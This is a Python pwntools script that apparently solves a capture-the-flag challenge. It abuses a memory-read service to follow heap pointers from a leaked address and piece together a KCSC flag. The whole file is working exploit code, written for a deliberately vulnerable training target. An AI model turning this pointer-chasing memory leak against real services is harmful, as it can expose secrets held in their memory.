from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
base = int(m.group(1), 16)
print(f'Dict base: {hex(base)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== Systematic flag search ===")

reads_used = 0
max_reads = 45
flag_fragments = []

# First, scan the dict structure looking for heap pointers 
# (more restrictive range for safer pointer following)
potential_pointers = []

for offset in range(0, 0x80, 8):  # First part of dict object
    if reads_used >= 15:  # Reserve most reads for following pointers
        break
        
    addr = base + offset
    data = read_memory(addr)
    reads_used += 1
    
    if data:
        val = u64(data)
        print(f'{addr:#x}: {val:#016x}')
        
        # Look for heap pointers in reasonable range (same high bits as base)
        base_high = base & 0xfffff00000000000
        val_high = val & 0xfffff00000000000
        
        if base_high == val_high and 0x1000 < (val & 0xfffff) < 0xfffff:
            potential_pointers.append(val)
            print(f'  -> Good pointer candidate: {val:#x}')

print(f"\nFound {len(potential_pointers)} pointer candidates")

# Now follow the most promising pointers
for i, ptr in enumerate(potential_pointers[:10]):  # Limit to 10 pointers
    if reads_used >= max_reads - 5:
        break
        
    print(f"\n--- Following pointer {i+1}: {ptr:#x} ---")
    
    # Read from the pointer
    data = read_memory(ptr)
    reads_used += 1
    
    if data:
        # Check for string-like data
        printable = []
        for b in data:
            if 32 <= b <= 126:
                printable.append(chr(b))
            elif b == 0:  # Null terminator
                break
        
        text = ''.join(printable)
        if text:
            print(f'  Text at {ptr:#x}: "{text}"')
            flag_fragments.append(text)
            
            if any(c in text for c in 'KCSC{}'):
                print(f'  *** FLAG PATTERN FOUND: "{text}" ***')
        
        # Also try reading a bit before and after this address
        for delta in [-8, 8, 16, -16]:
            if reads_used >= max_reads - 2:
                break
            
            scan_addr = ptr + delta
            scan_data = read_memory(scan_addr)
            reads_used += 1
            
            if scan_data:
                scan_chars = ''.join(chr(b) for b in scan_data if 32 <= b <= 126)
                if scan_chars:
                    print(f'  Nearby {ptr+delta:#x}: "{scan_chars}"')
                    flag_fragments.append(scan_chars)

print(f"\n=== Results (used {reads_used}/{max_reads} reads) ===")
print("All text fragments found:")
for i, frag in enumerate(flag_fragments):
    print(f"{i+1}: '{frag}'")

# Look for flag-like patterns in fragments
flag_parts = []
for frag in flag_fragments:
    if any(pattern in frag for pattern in ['KCSC', 'flag', '{', '}']) or len(frag) == 1:
        flag_parts.append(frag)

if flag_parts:
    print(f"\nPotential flag components: {flag_parts}")
    
    # Try to piece together the flag
    full_flag = ''.join(flag_parts)
    print(f"Concatenated: {full_flag}")

io.close()